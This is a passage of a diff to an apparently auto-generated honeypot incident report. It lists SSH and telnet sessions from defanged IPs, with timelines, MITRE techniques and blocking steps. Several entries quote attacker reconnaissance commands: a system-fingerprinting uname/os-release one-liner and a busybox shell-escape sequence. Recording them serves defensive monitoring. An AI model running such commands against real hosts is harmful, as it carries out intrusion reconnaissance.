+| `2026-08-22 15:32:50` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-c94d70774503
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:34 |
+| **Last Seen** | 2026-08-22 15:34 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:34:08` | `cowrie.session.connect` |
+| `2026-08-22 15:34:08` | `cowrie.client.version` |
+| `2026-08-22 15:34:08` | `cowrie.client.kex` |
+| `2026-08-22 15:34:09` | `cowrie.login.success` |
+| `2026-08-22 15:34:10` | `cowrie.session.params` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.success` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:10` | `cowrie.command.input` |
+| `2026-08-22 15:34:11` | `cowrie.log.closed` |
+| `2026-08-22 15:34:11` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-9b54a6eb6eab
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:35 |
+| **Last Seen** | 2026-08-22 15:35 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -407,38 +1962,858 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 12:56:20` | `cowrie.session.connect` |
-| `2026-08-22 12:56:21` | `cowrie.client.version` |
-| `2026-08-22 12:56:21` | `cowrie.client.kex` |
-| `2026-08-22 12:56:21` | `cowrie.login.success` |
-| `2026-08-22 12:56:22` | `cowrie.session.params` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.success` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.command.input` |
-| `2026-08-22 12:56:22` | `cowrie.log.closed` |
-| `2026-08-22 12:56:22` | `cowrie.session.closed` |
+| `2026-08-22 15:35:31` | `cowrie.session.connect` |
+| `2026-08-22 15:35:31` | `cowrie.client.version` |
+| `2026-08-22 15:35:31` | `cowrie.client.kex` |
+| `2026-08-22 15:35:31` | `cowrie.login.success` |
+| `2026-08-22 15:35:32` | `cowrie.session.params` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.success` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.command.input` |
+| `2026-08-22 15:35:32` | `cowrie.log.closed` |
+| `2026-08-22 15:35:33` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-506f45f95702
+### 🔴 HIGH · IR-cc814f6f821c
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `51.68.151[.]167` |
-| **First Seen** | 2026-08-22 12:57 |
-| **Last Seen** | 2026-08-22 12:57 |
+| **Source IP** | `64.110.90[.]250` |
+| **First Seen** | 2026-08-22 15:36 |
+| **Last Seen** | 2026-08-22 15:36 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:36:21` | `cowrie.session.connect` |
+| `2026-08-22 15:36:21` | `cowrie.client.version` |
+| `2026-08-22 15:36:21` | `cowrie.client.kex` |
+| `2026-08-22 15:36:22` | `cowrie.login.success` |
+| `2026-08-22 15:36:22` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
+- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-6d30694562f4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `64.110.90[.]250` |
+| **First Seen** | 2026-08-22 15:36 |
+| **Last Seen** | 2026-08-22 15:36 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:36:21` | `cowrie.session.connect` |
+| `2026-08-22 15:36:21` | `cowrie.client.version` |
+| `2026-08-22 15:36:21` | `cowrie.client.kex` |
+| `2026-08-22 15:36:22` | `cowrie.login.success` |
+| `2026-08-22 15:36:23` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
+- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-d659a8455f6b
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:36 |
+| **Last Seen** | 2026-08-22 15:36 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:36:52` | `cowrie.session.connect` |
+| `2026-08-22 15:36:53` | `cowrie.client.version` |
+| `2026-08-22 15:36:53` | `cowrie.client.kex` |
+| `2026-08-22 15:36:53` | `cowrie.login.success` |
+| `2026-08-22 15:36:54` | `cowrie.session.params` |
+| `2026-08-22 15:36:54` | `cowrie.command.input` |
+| `2026-08-22 15:36:54` | `cowrie.command.input` |
+| `2026-08-22 15:36:54` | `cowrie.command.input` |
+| `2026-08-22 15:36:55` | `cowrie.command.input` |
+| `2026-08-22 15:36:55` | `cowrie.command.input` |
+| `2026-08-22 15:36:55` | `cowrie.command.success` |
+| `2026-08-22 15:36:55` | `cowrie.command.input` |
+| `2026-08-22 15:36:55` | `cowrie.command.input` |
+| `2026-08-22 15:36:55` | `cowrie.command.input` |
+| `2026-08-22 15:36:55` | `cowrie.command.input` |
+| `2026-08-22 15:36:56` | `cowrie.log.closed` |
+| `2026-08-22 15:36:56` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-e0b95c2f045f
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:38 |
+| **Last Seen** | 2026-08-22 15:38 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:38:16` | `cowrie.session.connect` |
+| `2026-08-22 15:38:16` | `cowrie.client.version` |
+| `2026-08-22 15:38:16` | `cowrie.client.kex` |
+| `2026-08-22 15:38:17` | `cowrie.login.success` |
+| `2026-08-22 15:38:18` | `cowrie.session.params` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.success` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:18` | `cowrie.command.input` |
+| `2026-08-22 15:38:19` | `cowrie.log.closed` |
+| `2026-08-22 15:38:19` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-ba68b60351f7
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:39 |
+| **Last Seen** | 2026-08-22 15:39 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:39:24` | `cowrie.session.connect` |
+| `2026-08-22 15:39:24` | `cowrie.client.version` |
+| `2026-08-22 15:39:24` | `cowrie.client.kex` |
+| `2026-08-22 15:39:25` | `cowrie.login.success` |
+| `2026-08-22 15:39:25` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:39:26` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:39:26` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:39:26` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-17865439e4f5
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:39 |
+| **Last Seen** | 2026-08-22 15:39 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:39:28` | `cowrie.session.connect` |
+| `2026-08-22 15:39:28` | `cowrie.client.version` |
+| `2026-08-22 15:39:29` | `cowrie.client.kex` |
+| `2026-08-22 15:39:29` | `cowrie.login.success` |
+| `2026-08-22 15:39:30` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:39:30` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:39:30` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:39:30` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-fb54964fe4ff
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:39 |
+| **Last Seen** | 2026-08-22 15:39 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:39:52` | `cowrie.session.connect` |
+| `2026-08-22 15:39:52` | `cowrie.client.version` |
+| `2026-08-22 15:39:52` | `cowrie.client.kex` |
+| `2026-08-22 15:39:53` | `cowrie.login.success` |
+| `2026-08-22 15:39:53` | `cowrie.session.params` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.success` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.command.input` |
+| `2026-08-22 15:39:53` | `cowrie.log.closed` |
+| `2026-08-22 15:39:54` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-1ff2831baef8
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.158.88[.]156` |
+| **First Seen** | 2026-08-22 15:41 |
+| **Last Seen** | 2026-08-22 15:41 |
+| **Session Duration** | 31s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox EWSTE` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:41:10` | `cowrie.session.connect` |
+| `2026-08-22 15:41:10` | `cowrie.telnet.option` |
+| `2026-08-22 15:41:11` | `cowrie.login.success` |
+| `2026-08-22 15:41:11` | `cowrie.session.params` |
+| `2026-08-22 15:41:11` | `cowrie.command.input` |
+| `2026-08-22 15:41:11` | `cowrie.command.failed` |
+| `2026-08-22 15:41:11` | `cowrie.command.input` |
+| `2026-08-22 15:41:11` | `cowrie.command.failed` |
+| `2026-08-22 15:41:11` | `cowrie.command.input` |
+| `2026-08-22 15:41:11` | `cowrie.command.failed` |
+| `2026-08-22 15:41:11` | `cowrie.command.input` |
+| `2026-08-22 15:41:12` | `cowrie.command.input` |
+| `2026-08-22 15:41:42` | `cowrie.log.closed` |
+| `2026-08-22 15:41:42` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.158.88[.]156` to AbuseIPDB if not already reported
+- [ ] Block `195.158.88[.]156` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-9fad9c35dc73
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:41 |
+| **Last Seen** | 2026-08-22 15:41 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:41:33` | `cowrie.session.connect` |
+| `2026-08-22 15:41:33` | `cowrie.client.version` |
+| `2026-08-22 15:41:33` | `cowrie.client.kex` |
+| `2026-08-22 15:41:33` | `cowrie.login.success` |
+| `2026-08-22 15:41:34` | `cowrie.session.params` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.success` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.command.input` |
+| `2026-08-22 15:41:34` | `cowrie.log.closed` |
+| `2026-08-22 15:41:34` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b6c619ad7517
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `220.246.46[.]144` |
+| **First Seen** | 2026-08-22 15:42 |
+| **Last Seen** | 2026-08-22 15:42 |
+| **Session Duration** | 9s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:42:47` | `cowrie.session.connect` |
+| `2026-08-22 15:42:49` | `cowrie.client.version` |
+| `2026-08-22 15:42:49` | `cowrie.client.kex` |
+| `2026-08-22 15:42:51` | `cowrie.login.success` |
+| `2026-08-22 15:42:52` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:42:57` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `220.246.46[.]144` to AbuseIPDB if not already reported
+- [ ] Block `220.246.46[.]144` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-f82009e78d96
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `211.53.58[.]10` |
+| **First Seen** | 2026-08-22 15:42 |
+| **Last Seen** | 2026-08-22 15:43 |
+| **Session Duration** | 11s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:42:58` | `cowrie.session.connect` |
+| `2026-08-22 15:42:59` | `cowrie.client.version` |
+| `2026-08-22 15:42:59` | `cowrie.client.kex` |
+| `2026-08-22 15:43:03` | `cowrie.login.success` |
+| `2026-08-22 15:43:04` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:43:09` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `211.53.58[.]10` to AbuseIPDB if not already reported
+- [ ] Block `211.53.58[.]10` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-262f811c570a
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:43 |
+| **Last Seen** | 2026-08-22 15:43 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:43:12` | `cowrie.session.connect` |
+| `2026-08-22 15:43:12` | `cowrie.client.version` |
+| `2026-08-22 15:43:12` | `cowrie.client.kex` |
+| `2026-08-22 15:43:13` | `cowrie.login.success` |
+| `2026-08-22 15:43:13` | `cowrie.session.params` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.success` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:13` | `cowrie.command.input` |
+| `2026-08-22 15:43:14` | `cowrie.log.closed` |
+| `2026-08-22 15:43:14` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-d6add14f1ae4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:44 |
+| **Last Seen** | 2026-08-22 15:44 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:44:32` | `cowrie.session.connect` |
+| `2026-08-22 15:44:32` | `cowrie.client.version` |
+| `2026-08-22 15:44:32` | `cowrie.client.kex` |
+| `2026-08-22 15:44:32` | `cowrie.login.success` |
+| `2026-08-22 15:44:34` | `cowrie.session.params` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.success` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.command.input` |
+| `2026-08-22 15:44:34` | `cowrie.log.closed` |
+| `2026-08-22 15:44:35` | `cowrie.session.closed` |
+
